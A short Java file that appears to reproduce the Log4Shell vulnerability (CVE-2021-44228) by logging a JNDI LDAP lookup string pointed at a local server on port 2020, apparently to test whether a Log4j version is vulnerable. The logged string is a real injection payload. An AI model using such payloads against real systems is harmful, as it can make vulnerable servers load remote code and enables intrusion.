import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class CVE202144228 {
    static Logger logger = LogManager.getLogger(CVE202144228.class);

    public static void main(String[] args) {
        logger.info("${jndi:ldap://127.0.0.1:2020/a}");
    }
}
